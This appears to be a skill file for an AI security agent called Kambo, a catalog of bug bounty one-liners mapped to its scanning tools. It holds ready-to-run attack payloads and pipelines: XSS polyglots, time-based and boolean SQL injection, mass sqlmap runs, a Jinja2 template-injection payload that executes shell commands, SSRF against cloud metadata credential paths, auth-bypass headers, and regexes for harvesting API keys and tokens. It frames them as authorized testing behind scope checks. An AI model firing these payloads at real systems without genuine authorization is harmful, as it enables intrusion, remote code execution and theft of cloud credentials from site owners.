---
name: kambo-kingrecon
description: Curated catalog of bug bounty one-liners from KingOfBugBountyTips, mapped to Kambo MCP tools. Use when the operator asks for proven recon/exploitation recipes (subdomain enum, JS secret hunting, XSS/SQLi/SSRF pipelines, content discovery, API security, CVE-2025/2026 detection, certstream monitoring, ASN/cert intel).
triggers:
  - kingofbugbounty
  - kingrecon
  - king recon
  - ofjaaah
  - bug bounty oneliner
  - king of bugbounty
  - technique catalog
  - certstream pipeline
  - tlsx pipeline
---

# Kambo KingRecon — Curated One-Liner Catalog

This skill is a reference library of battle-tested bug bounty techniques
from the [KingOfBugBountyTips](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
repository (maintained by OFJAAAH), mapped to Kambo's evidence-graded MCP tools.

**Why this matters**: KingOfBugBountyTips is a curated catalog of 400+
one-liners that real hunters use daily. Each technique encodes hard-won
operational knowledge — source ordering, dedup strategy, payload choice,
filter logic. Kambo already implements many of these as instrumented tools;
this skill maps the catalog to those tools and provides raw one-liners for
the gaps.

## When to invoke

Use this skill when the operator:
- Asks for "the one-liner for X" or "how the pros do X"
- References KingOfBugBountyTips, OFJAAAH, or bugbuntu
- Wants a specific recipe (certstream monitor, JS secret hunt, SSRF chain)
- Asks how to detect a CVE-2025/2026 vuln class
- Needs a fallback when a Kambo tool returns thin results

## Conventions used in this catalog

One-liners below assume the same shell variables and intermediate files
across sections. Set or produce them once per session:

| Symbol | Meaning |
|--------|---------|
| `$T` | Root target domain (e.g. `example.com`). Set with `export T=example.com`. |
| `$ORG` | Organization name for ASN / GitHub dorks (e.g. `Acme Corp`). |
| `subs.txt` | All discovered subdomains, one per line. |
| `alive.txt` | Subdomains that responded to `httpx` (live HTTP hosts). |
| `urls.txt` | Crawled / wayback URLs (full URLs with paths and query strings). |
| `js.txt` | URLs of `.js` files extracted from crawling. |
| `params.txt` | Parameter wordlist (e.g. SecLists `burp-parameter-names.txt`). |
| `wordlist.txt` | Content-discovery wordlist (e.g. SecLists `raft-medium-directories.txt`). |
| `resolvers.txt` | Trusted DNS resolvers (e.g. `trickest/resolvers/resolvers-trusted.txt`). |

Tools assumed to be on `$PATH` inside the Kambo Docker container:
`subfinder`, `amass`, `assetfinder`, `findomain`, `chaos`, `httpx`,
`dnsx`, `tlsx`, `katana`, `gau`, `waybackurls`, `gf`, `qsreplace`, `uro`,
`anew`, `nuclei`, `dalfox`, `ffuf`, `feroxbuster`, `arjun`, `jq`, `curl`,
`certstream`, `shodan`.

## Operating principles

1. **Prefer Kambo tools** — they ship with evidence chains, metrics, and
   scope validation. Drop to raw one-liners only when no Kambo tool covers
   the technique.
2. **Always validate scope first** — run `set_scope` before any active
   command. KingOfBugBountyTips assumes authorized testing.
3. **Record the source** — when you run a raw one-liner, note the
   technique name in operational learnings so it gets metrics tracked
   over time.
4. **Pipe into evidence** — wrap raw command output through
   `vuln_*` or `scan_*` tools so the result enters the confidence chain.

---

## Catalog: Recon

### Subdomain enumeration (multi-source)

KingOfBugBountyTips combines subfinder + amass + assetfinder + chaos +
findomain + crt.sh, then `httpx` for liveness, then `anew` for dedup.

→ **Kambo tool**: `recon_subdomains` with `methods=["crtsh", "subfinder", "amass"]`
already cross-validates and tags each subdomain with its sources, plus runs
wildcard detection. Prefer this over the raw chain.

Raw fallback when you need findomain/chaos/assetfinder, which Kambo doesn't run:
```bash
(subfinder -d $T -all -silent; assetfinder -subs-only $T; findomain -t $T -q; chaos -d $T -silent; curl -s "https://crt.sh/?q=%25.$T&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g') | sort -u | httpx -silent -threads 100 | anew alive.txt
```

### Certificate Transparency

→ **Kambo tool**: `recon_certs` (pulls crt.sh).

Real-time monitoring via certstream is *not* in Kambo. Run as a
long-running background process when watching for new assets:
```bash
certstream --full | jq -r '.data.leaf_cert.all_domains[]? // empty' | grep -E "\.$T$" | sort -u | anew certstream_subs.txt
```

### ASN / reverse DNS / BGP

→ **Kambo tool**: `recon_asn` covers ASN lookup.

Raw for BGP range → reverse DNS:
```bash
echo "$ORG" | metabigor net --org -v | awk '{print $3}' | xargs -I@ sh -c 'prips @ | hakrevdns | anew rev_dns.txt'
```

### DNS intelligence (dnsx pipeline)

Multi-record + dangling-CNAME hunt for takeover candidates:
```bash
subfinder -d $T -silent | dnsx -silent -cname -resp-only | grep -iE "(s3|cloudfront|herokuapp|github|azure|shopify|fastly|pantheon|zendesk|readme|ghost|surge|bitbucket|wordpress|tumblr)" | anew cname_takeover.txt
```
→ **Pipe into**: `vuln_subdomain_takeover` for confirmation with evidence.

### TLS recon (tlsx)

Mismatched / expired / self-signed certs, JARM fingerprints:
```bash
subfinder -d $T -silent | httpx -silent | tlsx -san -cn -so -ss -expired -self-signed -mismatched -jarm -json -silent | tee tlsx.json
```
→ **Kambo tool**: `scan_tls` covers the common case.

### Wildcard discovery — TLS SAN extraction

```bash
echo $T | httpx -silent | xargs -I@ sh -c 'echo | openssl s_client -connect @:443 2>/dev/null | openssl x509 -noout -text | grep -oP "DNS:[^\s,]+" | sed "s/DNS://"' | sort -u | anew ssl_subs.txt
```

### Favicon → Shodan correlation

```bash
curl -s https://$T/favicon.ico | md5sum | awk '{print $1}' | xargs -I@ shodan search "http.favicon.hash:@" --fields ip_str,hostnames | anew favicon_hosts.txt
```

---

## Catalog: JavaScript recon

This is the highest-ROI category in KingOfBugBountyTips — JS files leak
endpoints, AWS/GCP/Firebase keys, internal IPs, Slack/Discord webhooks,
GitHub tokens, JWTs, and source maps.

### JS discovery pipeline

```bash
subfinder -d $T -silent | httpx -silent | katana -d 5 -jc -silent | grep -iE '\.js$' | anew js.txt
```
→ **Kambo tool**: `scan_api_endpoints` enumerates JS-referenced endpoints
with evidence. Use the raw command when you want offline copies for
manual review.

### Secret extraction patterns (regex catalog)

| Secret | Pattern |
|--------|---------|
| AWS key | `(AKIA\|ABIA\|ACCA\|ASIA)[0-9A-Z]{16}` |
| Google API | `AIza[0-9A-Za-z\-_]{35}` |
| GitHub PAT | `gh[pousr]_[a-zA-Z0-9]{36}` or `github_pat_[a-zA-Z0-9]{22}_[a-zA-Z0-9]{59}` |
| Slack webhook | `https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+` |
| Discord webhook | `https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+` |
| Firebase | `https://[a-zA-Z0-9-]+\.firebaseio\.com` |
| JWT | `eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*` |
| Internal IPs | `10\.[0-9.]+ \| 172\.(1[6-9]\|2[0-9]\|3[01])\.[0-9.]+ \| 192\.168\.[0-9.]+` |
| Private key | `-----BEGIN (RSA \|EC \|DSA \|OPENSSH \|PGP )?PRIVATE KEY` |

→ **Kambo tool**: `cloud_secret_scan` covers AWS/GCP/keys with confidence
grading. Use raw greps for less common patterns (Discord, JWTs).

### Webpack source maps

```bash
cat js.txt | sed 's/\.js$/.js.map/' | httpx -silent -mc 200 -ct -match-string "sourcesContent" | anew sourcemaps.txt
```
High-impact: source maps expose unminified frontend code, including
hidden API routes and developer comments.

### Hidden admin routes from JS

```bash
cat js.txt | xargs -I@ curl -s @ | grep -oE "[\"\'][/][a-zA-Z0-9_/-]*(admin|dashboard|manage|config|settings|internal|private|debug|api/v[0-9])[a-zA-Z0-9_/-]*[\"\']" | tr -d "\"'" | sort -u | anew hidden_routes.txt
```

---

## Catalog: Vulnerability detection

### XSS

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| Reflected param discovery | `cat urls.txt \| kxss 2>/dev/null \| grep -v "Not Reflected"` | `vuln_xss` |
| Dalfox pipe | `cat urls.txt \| gf xss \| uro \| qsreplace '"><svg onload=confirm(1)>' \| dalfox pipe --silence` | `vuln_xss` |
| Airixss confirm | `... \| airixss -payload "confirm(1)"` | `vuln_xss` |
| Nuclei DAST | `nuclei -l urls.txt -dast -t dast/vulnerabilities/xss/ -rl 50` | `scan_vulns` |
| Polyglot | `qsreplace "jaVasCript:/*-/*\`/*\\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//"` | manual |

### SQL injection

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| Error-based | `gf sqli \| qsreplace "'" \| httpx -silent -ms "error\|sql\|syntax\|mysql\|postgresql"` | `vuln_sqli` |
| Time-based | `qsreplace "1' AND SLEEP(5)-- -" \| httpx -silent -timeout 10` | `vuln_sqli` |
| Boolean | `qsreplace "1' AND '1'='1" \| httpx -silent -mc 200` | `vuln_sqli` |
| SQLMap mass | `sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2` | `exploit_sqli` |
| NoSQL | `qsreplace '{"$gt":""}' \| httpx -silent -mc 200` | manual |

### SSRF / SSTI

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| Out-of-band | `gf ssrf \| qsreplace "https://YOURBURP.oastify.com" \| httpx -silent` | `vuln_ssrf` |
| AWS metadata | `qsreplace "http://169.254.169.254/latest/meta-data/" \| httpx -silent -match-string "ami-id"` | `cloud_imds_test` |
| SSTI 7\*7 | `gf ssti \| qsreplace "{{7*7}}" \| httpx -silent -match-string "49"` | manual |
| Jinja2 RCE | `qsreplace "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"` | manual |

### Subdomain takeover

```bash
subfinder -d $T -silent | httpx -silent | nuclei -t takeovers/ -c 50
```
→ **Kambo tool**: `vuln_subdomain_takeover` — uses Nuclei takeover
templates and grades by CNAME match + service fingerprint.

---

## Catalog: Content & parameter discovery

### Content discovery

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| Recursive ffuf | `ffuf -u $T/FUZZ -w wordlist.txt -recursion -recursion-depth 3 -mc 200,301,302,403 -ac -c -t 100` | `scan_directories` |
| Feroxbuster recursive | `feroxbuster -u $T -w wordlist.txt -d 5 -L 4 --auto-tune -C 404,500 --smart` | `scan_directories` |
| Git exposure | `httpx -silent -path /.git/config -mc 200 -ms "[core]"` | `scan_directories` |
| Backup/config files | `httpx -silent -path /.env,/config.php,/wp-config.php.bak,/server-status -mc 200` | `scan_directories` |
| API docs | `httpx -silent -path /swagger.json,/openapi.json,/api-docs,/swagger-ui.html -mc 200` | `scan_api_endpoints` |

### Parameter discovery

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| Arjun | `arjun -i urls.txt -oT arjun_params.txt --stable` | `scan_parameters` |
| x8 | `cat urls.txt \| xargs -I@ x8 -u @ -w params.txt` | `scan_parameters` |
| ParamSpider | `paramspider -d $T --exclude woff,css,js,png,svg,jpg -o params.txt` | `scan_parameters` |
| Mine from JS | `cat js.txt \| xargs -I@ curl -s @ \| grep -oE "[?&][a-zA-Z0-9_]+=" \| cut -d'=' -f1 \| tr -d '?&' \| sort -u` | manual |

### URL collection (gau + wayback + katana)

```bash
cat alive.txt | xargs -P50 -I{} sh -c 'echo {} | waybackurls & echo {} | gau --threads 10 --blacklist png,jpg,gif,svg,woff,ttf & echo {} | katana -d 3 -jc -kf all -silent' | uro | anew all_urls.txt
```

---

## Catalog: API security

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| GraphQL introspection | `curl -s $T/graphql -d '{"query":"{__schema{types{name}}}"}' -H "Content-Type: application/json"` | `api_test_misconfig` |
| BOLA candidates | `grep -oE "(id\|user_id\|account_id\|uid)=[0-9]+"` | `api_test_bola` |
| BFLA / role bypass | header injection (`X-Forwarded-For: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`) | `api_test_bfla` |
| Mass assignment | `curl -X POST -d '{"admin":true,"role":"admin","isAdmin":true,"is_admin":1}'` | manual (no MCP tool yet) |
| API method fuzz | for each in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE | manual (no MCP tool yet) |
| Auth bypass headers | `X-Originating-IP / X-Forwarded-For / X-Remote-IP / X-Remote-Addr: 127.0.0.1` | manual (no MCP tool yet) |

---

## Catalog: Cloud

| Technique | Recipe | Kambo tool |
|-----------|--------|------------|
| S3 finder from URLs | `grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com"` | `cloud_storage_enum` |
| S3 perm check | `aws s3 ls s3://$bucket --no-sign-request` | `cloud_storage_enum` |
| Firebase open DB | `curl -s $T.firebaseio.com/.json \| grep -v "null"` | `cloud_storage_enum` |
| Azure blob | `grep -oE "[a-zA-Z0-9-]+\.blob\.core\.windows\.net"` | `cloud_storage_enum` |
| GCP storage | `grep -oE "storage\.googleapis\.com/[a-zA-Z0-9-]+"` | `cloud_storage_enum` |
| AWS metadata SSRF | `qsreplace "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` | `cloud_imds_test` |

---

## Catalog: CVE-2025 / 2026 detection

KingOfBugBountyTips maintains fingerprint + version-check recipes for
fresh high-severity CVEs. These are detection-only; Kambo's
`scan_vulns` should always be the executor (loads the official
template with evidence grading).

| CVE | Product | Severity | Detection signal |
|-----|---------|----------|------------------|
| CVE-2026-21858 (Ni8mare) | n8n < 1.121.0 | 10.0 | `/rest/settings` returns `versionCli`; webhook-test endpoint accepts POST |
| CVE-2026-21877 | n8n Git node < 1.121.3 | 10.0 | `/rest/node-types` matches `git` |
| CVE-2026-0625 | D-Link DSL routers | 9.3 | `/dnscfg.cgi` exists |
| CVE-2026-24061 | GNU inetutils telnetd 1.9.3–2.7 | 9.8 | banner contains `inetutils` / `GNU` |
| CVE-2025-59470 | Veeam B&R ≤ 13.0.1.180 | 9.0 | `/api/v1/version` matches `13\.0\.[01]\.[0-9]+` |
| CVE-2025-55182 (React2Shell) | React 19.0–19.2 / Next.js 15.0.4–16.0.6 | 10.0 | POST accepts `Next-Action` header (non-404 response) |
| CVE-2025-4123 | Grafana XSS | HIGH | open redirect on `/login?redirect=//evil.com` |

Detection one-liner template (n8n example):
```bash
subfinder -d $T -silent | httpx -silent | xargs -I@ -P30 sh -c 'curl -s "@/rest/settings" 2>/dev/null | grep -q "versionCli" && echo "[N8N] @"' | nuclei -t http/cves/2026/CVE-2026-21858.yaml -silent
```

→ **Always run** the matching Nuclei template via `scan_vulns` after
fingerprinting — that's what produces a CONFIRMED-grade evidence chain.

---

## Catalog: gf patterns (vulnerability tagging)

KingOfBugBountyTips relies heavily on tomnomnom's `gf` to bucket URLs
into vulnerability classes before fuzzing. Install via:

```bash
go install github.com/tomnomnom/gf@latest && git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf
```

Standard buckets used across the catalog: `gf xss`, `gf sqli`, `gf ssrf`,
`gf ssti`, `gf lfi`, `gf redirect`, `gf rce`, `gf debug_logic`,
`gf img-traversal`, `gf interestingsubs`, `gf interestingEXT`.

Pipeline pattern:
```bash
cat all_urls.txt | uro | gf $CLASS | qsreplace $PAYLOAD | httpx -silent $FILTER
```

---

## Workflow: when the operator asks "find me bugs on X"

1. Run `set_scope` with the target.
2. Use `/kambo-hunt` as the autonomous driver — it already chains the
   Kambo tools that cover ~80% of this catalog with evidence grading.
3. When `/kambo-hunt` finishes a phase with thin results, drop to a raw
   one-liner from this catalog **as a complement**, not a replacement.
4. Pipe any new findings back through a Kambo `vuln_*` or `scan_*` tool
   to enter the evidence chain.

## Workflow: when the operator asks for a specific technique

1. Look up the technique in the relevant catalog section above.
2. Prefer the mapped Kambo tool. Reach for the raw one-liner only when:
   - No Kambo tool covers it
   - The Kambo tool returned 0 results and you want a second source
   - The operator explicitly wants to run the upstream recipe
3. After running a raw command, log the technique name and outcome via
   the learnings store so it accrues metrics over time.

## Authorization & attribution

- Original catalog: <https://github.com/KingOfBugbounty/KingOfBugBountyTips>
  by [OFJAAAH](https://twitter.com/ofjaaah). Educational / authorized use only.
- The catalog includes DoD VDP scope (`*.af.mil`, `*.army.mil`, etc.).
  Kambo will refuse any active command against these without an explicit
  `set_scope` for the DoD program — that gate stays on.
- This skill is descriptive (a reference), not a bypass. Every active
  command still goes through `docker_runner` → `validate_scope` →
  evidence chain → metrics. Out-of-scope targets are rejected the same
  way they would be from any other Kambo entry point.
